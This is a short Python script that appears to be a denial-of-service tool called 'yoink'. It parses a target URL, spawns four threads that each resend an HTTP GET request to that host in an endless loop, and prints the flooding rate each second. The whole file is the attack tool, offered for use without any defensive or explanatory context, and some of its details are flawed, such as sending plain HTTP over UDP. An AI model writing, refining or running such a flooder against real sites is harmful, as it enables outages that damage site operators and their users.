from threading import Thread
from time import sleep
import socket,ssl,sys


req = 0

def flood(scheme,addr,pkt):
    global req

    if scheme == 'https':
        raw_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock = ssl.wrap_socket(raw_sock,ssl_version=ssl.PROTOCOL_TLSv1_2)
    else:
        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

    sock.connect(addr)

    while 1:
        sock.send(pkt)
        req += 1


def main():
    global req

    if len(sys.argv) != 2:
        print('usage: python3 yoink.py [url]')
        exit(1)
    
    url = sys.argv[1]
    split_url = url.split('/')
    scheme = split_url[0].replace(':','')
    hostname = split_url[2]

    if scheme == 'https':
        port = 443
    else:
        port = 80

    if ':' in hostname:
        port = int(hostname.split(':')[1])
        hostname = hostname.replace(':' + str(port),'')

    addr = (hostname,port)

    uri = url.replace(f'{scheme}://{hostname}:{port}','') or '/'
    pkt = f'GET {uri} HTTP/1.1\r\nHost: {hostname}\r\nConnection: keep-alive\r\n\r\n'.encode()

    for _ in range(4):
        t = Thread(target=flood,args=(scheme,addr,pkt))
        t.start()
    
    while 1:
        prev_req = req
        sleep(1)
        print(f'[yoink] flooding {url} at {req-prev_req} requests/sec!')
        req = 0


if __name__ == '__main__':
    main()
